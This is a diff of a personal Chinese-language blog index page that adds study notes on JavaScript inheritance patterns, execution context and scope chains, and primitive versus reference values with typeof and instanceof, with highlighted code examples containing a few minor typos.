@@ -182,6 +182,279 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
+      <meta itemprop="name" content="小柒">
+      <meta itemprop="description" content="欢迎来到我的世界!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柒">
+    </span>
+      <header class="post-header">
+
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/" class="post-title-link" itemprop="url">组合继承和原型继承</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-14 18:11:28" itemprop="dateCreated datePublished" datetime="2022-04-14T18:11:28+08:00">2022-04-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-01 10:29:50" itemprop="dateModified" datetime="2022-05-01T10:29:50+08:00">2022-05-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index"><span itemprop="name">JavaScript</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h1><p>综合了原型链和盗用构造函数，将两者优点结合，使用原型链继承原型上的属性和方法，<strong>通过盗用构造函数继承实例属性</strong>，这样既可以把<strong>方法定义在原型上实现重用</strong>，又可以<strong>让每个实例都有自己的属性</strong></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name=name;</span><br><span class="line">    <span class="built_in">this</span>.colors=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  SuperType.prototype.sayName=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);<span class="comment">//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">      SuperType.call(<span class="built_in">this</span>,name);<span class="comment">//SuperType的构造函数绑定SubType的构造函数,自定义实例属性，第二次调用SuperType</span></span><br><span class="line">      <span class="built_in">this</span>.age=age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继承原型上的方法，让SubType的原型指向SuperType的实例,第一次调用SuperType，SubType的constructor会委托到SuperType.prototype上的constructor，进而指向SuperType</span></span><br><span class="line">SubType.prototype=<span class="keyword">new</span> SuperType();</span><br><span class="line">SubType.prototype.sayAge=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.age);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> instance1=<span class="keyword">new</span> SubType(<span class="string">&#x27;Ann&#x27;</span>,<span class="number">29</span>);</span><br><span class="line">instance1.colors.push(<span class="string">&quot;balck&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance1.colors);</span><br><span class="line">instance1.sayName();</span><br><span class="line">instance1.sayAge();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> instance2=<span class="keyword">new</span> SubType(<span class="string">&quot;Greg&quot;</span>,<span class="number">27</span>);</span><br><span class="line"><span class="built_in">console</span>.log(instance2.colors);</span><br><span class="line">instance2.sayName();</span><br><span class="line">instance2.sayAge();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/14/%E7%BB%A7%E6%89%BF%E6%96%B9%E5%BC%8F/1.jpg" alt="1"></p>
+<h1 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//object.create()</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>)</span>&#123;&#125;;<span class="comment">//创建一个构造函数</span></span><br><span class="line">    F.prototype=o;<span class="comment">//构造函数的原型指向参数对象o</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();<span class="comment">//返回F对象实例</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Ann&quot;</span>,</span><br><span class="line">    <span class="attr">friends</span>:[<span class="string">&quot;Mary&quot;</span>,<span class="string">&quot;Harry&quot;</span>,<span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> anotherPerson=object(person);</span><br><span class="line">anotherPerson.friends.push(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person.friends);<span class="comment">// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p>object()函数创建一个临时构造函数，将传入对象赋值给这个构造函数原型，然后返回这个临时类型的一个实例。本质上，object()是对传入的对象执行了一次浅复制，<strong>anotherperson.proto=person</strong>,如果person是构造函数，<strong>则anotherperson的[[Prototype]]将没有指向的prototype对象，也就无法通过prototype对象找到constructor进而使用construcor上面的方法和属性</strong></p>
+<p>这里的object函数相当与object.create()</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Ann&quot;</span>,</span><br><span class="line">    <span class="attr">friends</span>:[<span class="string">&quot;Mary&quot;</span>,<span class="string">&quot;Harry&quot;</span>,<span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> anotherPerson=object。create(person);</span><br><span class="line">anotherPerson.friends.push(<span class="string">&quot;Mike&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(person.friends);<span class="comment">// [&#x27;Mary&#x27;, &#x27;Harry&#x27;, &#x27;Van&#x27;, &#x27;Mike&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p>原型式继承适合不需要单独创建构造函数，但仍然需要在对象间共享信息的场合。</p>
+<h1 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h1><p>与原型式继承比较接近的一种继承方式是寄生式继承</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createAnother</span>(<span class="params">original</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> clone=<span class="built_in">Object</span>.create(original);<span class="comment">//通过调用函数创建一个新对象</span></span><br><span class="line">    clone.sayHi=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">//以某种方式增强这个对象</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clone;<span class="comment">//返回这个对象</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&quot;Ann&quot;</span>,</span><br><span class="line">    <span class="attr">friends</span>:[<span class="string">&quot;Mary&quot;</span>,<span class="string">&quot;Harry&quot;</span>,<span class="string">&quot;Van&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> anotherPerson=createAnother(person);</span><br><span class="line">anotherPerson.sayHi();</span><br></pre></td></tr></table></figure>
+
+<p>寄生式继承同样适合主要关注对象，而不在乎类型和构造函数的场景。痛过寄生式继承给对象添加函数会导致函数难以重用，与构造函数模式类似。</p>
+<h1 id="寄生式组合继承"><a href="#寄生式组合继承" class="headerlink" title="寄生式组合继承"></a>寄生式组合继承</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inheritPrototype</span>(<span class="params">subType,superType</span>)</span>&#123;<span class="comment">//参数分别是子类和父类的构造函数</span></span><br><span class="line">   <span class="keyword">let</span> prototype=<span class="built_in">Object</span>.create(superType.prototype);<span class="comment">//先复制父类的原型对象</span></span><br><span class="line">    prototype.constructor=subType;<span class="comment">//增强对象，让新的原型对象的构造函数指向子类构造函数</span></span><br><span class="line">    subType.prototype=prototype;<span class="comment">//赋值对象，让子类原型指向新的原型</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name=name;</span><br><span class="line">    <span class="built_in">this</span>.colors=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">   SuperType.prototype.sayName=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);<span class="comment">//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">       SuperType.call(<span class="built_in">this</span>,name);<span class="comment">//SuperType的构造函数绑定SubType的构造函数,调用Supertype()</span></span><br><span class="line">       <span class="built_in">this</span>.age=age;</span><br><span class="line"> &#125;</span><br><span class="line">inheritPrototype(SubType,SuperType);</span><br><span class="line">SubType.prototype.sayAge=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.age);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">let</span> instance1=<span class="keyword">new</span> SubType(<span class="string">&#x27;Ann&#x27;</span>,<span class="number">29</span>);</span><br><span class="line"> instance1.colors.push(<span class="string">&quot;balck&quot;</span>);</span><br><span class="line"> <span class="built_in">console</span>.log(instance1.colors);</span><br><span class="line"> instance1.sayName();</span><br><span class="line"> instance1.sayAge();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>另一种写法：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name=name;</span><br><span class="line">    <span class="built_in">this</span>.colors=[<span class="string">&quot;red&quot;</span>,<span class="string">&quot;blue&quot;</span>,<span class="string">&quot;green&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line">   SuperType.prototype.sayName=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);<span class="comment">//不能用箭头函数，因为箭头函数没有this绑定，会向上找到全局上下文</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params">name,age</span>) </span>&#123;</span><br><span class="line">       SuperType.call(<span class="built_in">this</span>,name);<span class="comment">//SuperType的构造函数绑定SubType的构造函数,调用Supertype()</span></span><br><span class="line">       <span class="built_in">this</span>.age=age;</span><br><span class="line"> &#125;</span><br><span class="line">SubType.prototype=<span class="built_in">Object</span>.create(SuperType.prototype)</span><br><span class="line">SubType.prototype.constructor=Subtype</span><br></pre></td></tr></table></figure>
+
+<p>寄生式组合继承基本模式：</p>
+<ul>
+<li>先创建父类原型的一个副本prototype</li>
+<li><strong>给prototype设置constructor属性为subType,增强对象，解决由于重写原型导致默认constructor丢失问题</strong></li>
+<li>将新创建的对象赋值给子类型的原型</li>
+</ul>
+<p>只调用一次SuperType构造函数，效率最高</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/14/%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
+      <meta itemprop="name" content="小柒">
+      <meta itemprop="description" content="欢迎来到我的世界!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柒">
+    </span>
+      <header class="post-header">
+
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/14/%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E5%92%8C%E4%BD%9C%E7%94%A8%E5%9F%9F/" class="post-title-link" itemprop="url">执行上下文和作用域</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-14 16:21:59 / 修改时间：16:45:20" itemprop="dateCreated datePublished" datetime="2022-04-14T16:21:59+08:00">2022-04-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index"><span itemprop="name">JavaScript</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>执行上下文有全局上下文和函数上下文，块级上下文：</p>
+<p>上下文中的代码在执行时，会创建变量对象的一个作用域链，这个作用域链决定了各级上下文中的代码在访问变量和函数时的顺序，代码正在执行的上下文的变量对象始终位于作用域链的最前端，如果上下文时函数，则其活动对象用作变量对象，作用域链中的下一个变量对象来自包含上下文…以此类推至全局上下文，<strong>全局上下文变量对象始终是作用域链的最后一个变量对象（window)</strong></p>
+<h2 id="作用域链增强"><a href="#作用域链增强" class="headerlink" title="作用域链增强"></a>作用域链增强</h2><p>执行上下文主要有全局上下文和函数上下文两种（eval()调用内部存在第三种上下文），但有其他方式增强作用域链，</p>
+<p>try/catch语句中的catch块</p>
+<p>with语句</p>
+<p>这两种情况会在作用域链的前端添加一个变量对象，对with语句来说，会向作用域链前端添加指定对象，对catch语句，会创建一个新的变量对象，这个变量对象会包含要抛出的错误对象的声明</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buildUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> qs=<span class="string">&quot;?debug=true&quot;</span>;</span><br><span class="line">    <span class="function"><span class="title">with</span>(<span class="params">location</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> url=href+qs;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>with语句将location对象作为上下文，因此location会被添加到作用域链的前端</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic3.zhimg.com/80/v2-93091834844364ab73fd617db4685210_720w.jpg?source=1940ef5c">
+      <meta itemprop="name" content="小柒">
+      <meta itemprop="description" content="欢迎来到我的世界!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小柒">
+    </span>
+      <header class="post-header">
+
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/14/%E5%8E%9F%E5%A7%8B%E5%80%BC%E4%B8%8E%E5%BC%95%E7%94%A8%E5%80%BC%E5%8F%8A%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/" class="post-title-link" itemprop="url">原始值与引用值及确定类型</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-14 15:04:04 / 修改时间：16:21:25" itemprop="dateCreated datePublished" datetime="2022-04-14T15:04:04+08:00">2022-04-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/JavaScript/" itemprop="url" rel="index"><span itemprop="name">JavaScript</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="原始值和引用值"><a href="#原始值和引用值" class="headerlink" title="原始值和引用值"></a>原始值和引用值</h1><p>ECMAScript变量可以包含两种不同类型的数据：原始值和引用值，原始值就是最简单的数据：Undefined,Null,Boolean,Number,String,Symbol,保存原始值的变量是按值访问的，因为我们操作的就是存储在变量中的实际值。</p>
+<p>引用值是保存在内存中的对象，JavaScript不允许直接访问内存位置，操作对象时，实际上操作的对该对象的引用，而非实际的对象本身，因此，保存引用值的变量是按引用访问的。</p>
+<h1 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h1><h2 id="动态属性"><a href="#动态属性" class="headerlink" title="动态属性"></a>动态属性</h2><p>引用值可以随时添加，修改删除属性。</p>
+<p>而原始值不能有属性，原始值的初始化只使用原始字面量形式，如果使用new关键字则JavaScript会创建一个Object类型的实例，</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name1=<span class="string">&quot;Nicholas&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> name2=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;Matt&quot;</span>);</span><br><span class="line">name1.age=<span class="number">27</span>;</span><br><span class="line">name2.age=<span class="number">26</span>;</span><br><span class="line"><span class="built_in">console</span>.log(name1.age);<span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(name2.age);<span class="comment">//26</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name1);<span class="comment">//string</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> name2);<span class="comment">//object</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="复制值"><a href="#复制值" class="headerlink" title="复制值"></a>复制值</h2><p>通过变量把一个原始值赋值到另一个变量时，原始值会被复制得到新变量的位置。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num1=<span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> num2=num1;</span><br></pre></td></tr></table></figure>
+
+<p>num1和num2相互独立，num2是num1的副本</p>
+<p>当把引用值从一个变量赋值给另一个变量时，存储在变量中的值也会被复制到新变量所在位置，区别在于：这里复制的值时一个指针，它指向存储在堆内存中的对象。两个变量实际上指向同一个对象。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line"><span class="keyword">let</span> obj2=obj1;</span><br><span class="line">obj1.name=<span class="string">&quot;Nic&quot;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj2.name);<span class="comment">//Nic</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h2><p>ECMAScript中所有函数的参数都是按值传递，这意味着函数外的值会被复制到函数内部参数中，就像一个变量赋值到另一个变量一样，如果是原始值，那么就跟原始值变量的复制一样，如果是引用值就和引用值的变量复制一样。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addTen</span>(<span class="params">num</span>)</span>&#123;<span class="comment">//count的值被复制到参数num,函数内部num+10但不会影响函数外部的原始变量count</span></span><br><span class="line">    num+=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> count=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">let</span> res=addTen(count);</span><br><span class="line"><span class="built_in">console</span>.log(count);<span class="comment">//20，没有变化</span></span><br><span class="line"><span class="built_in">console</span>.log(res);<span class="comment">//30</span></span><br></pre></td></tr></table></figure>
+
+<p>如果是对象：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setName</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">	obj.name=<span class="string">&quot;Nic&quot;</span>；<span class="comment">//此时多了一个obj指针指向person,将name改为Nic</span></span><br><span class="line">    obj=<span class="keyword">new</span> <span class="built_in">Object</span>();<span class="comment">//又创建一个指针，指向内存其他位置</span></span><br><span class="line">    obj.name=<span class="string">&quot;Greg&quot;</span>;<span class="comment">//函数调用结束，obj被销毁</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> person=<span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">setName(person);</span><br><span class="line"><span class="built_in">console</span>.log(person.name);<span class="comment">//&#x27;Nic&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h1><p>typeof用来判断一个变量是否为原始类型，即判断一个变量是否为字符串，数字，布尔值或undefined的最好方式，值为对象null,那么typeof返回Object</p>
+<p>typeof虽然对原始值很有用，但是对引用值用处不大，我们通常关心一个值是不是对象，而是想知道它是什么类型的对象。</p>
+<h1 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h1><p>如果变量是给定引用类型的实例，则instanceof操作符返回true</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person <span class="keyword">instanceof</span> <span class="built_in">Object</span>);<span class="comment">//变量person是Object吗</span></span><br></pre></td></tr></table></figure>
+
+<p>按照定义所有引用值都是Object的实例，因此通过instanceof检测的任何引用值和Object构造函数都会返回true。如果，使用instanceof检测原始值，则始终会返回false,因为原始值不是对象。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://coloey.github.io/2022/04/14/%E7%A1%AE%E5%AE%9A%E7%B1%BB%E5%9E%8B/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -599,7 +872,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-15 21:48:11" itemprop="dateModified" datetime="2022-04-15T21:48:11+08:00">2022-04-15</time>
+                <time title="修改时间：2022-05-02 11:20:59" itemprop="dateModified" datetime="2022-05-02T11:20:59+08:00">2022-05-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -668,7 +941,7 @@
 
 <p>在不使用箭头函数的情况下，是会报错的，因为最后调用 <code>setTimeout</code> 的对象是 window，但是在 window 中并没有 func1 函数。</p>
 <p>我们在改变 this 指向这一节将把这个例子作为 demo 进行改造。</p>
-<h2 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h2><p>众所周知，ES6 的箭头函数是可以避免 ES5 中使用 this 的坑的。<strong>箭头函数的 this 始终指向函数定义时的 this，而非执行时。</strong>，箭头函数需要记着这句话：<strong>“箭头函数中没有 this 绑定，必须通过查找作用域链来决定其值，如果箭头函数被非箭头函数包含，则 this 绑定的是最近一层非箭头函数的 this，否则，this 为 undefined”</strong>。<strong>箭头函数的绑定无法被修改，new也不可以</strong></p>
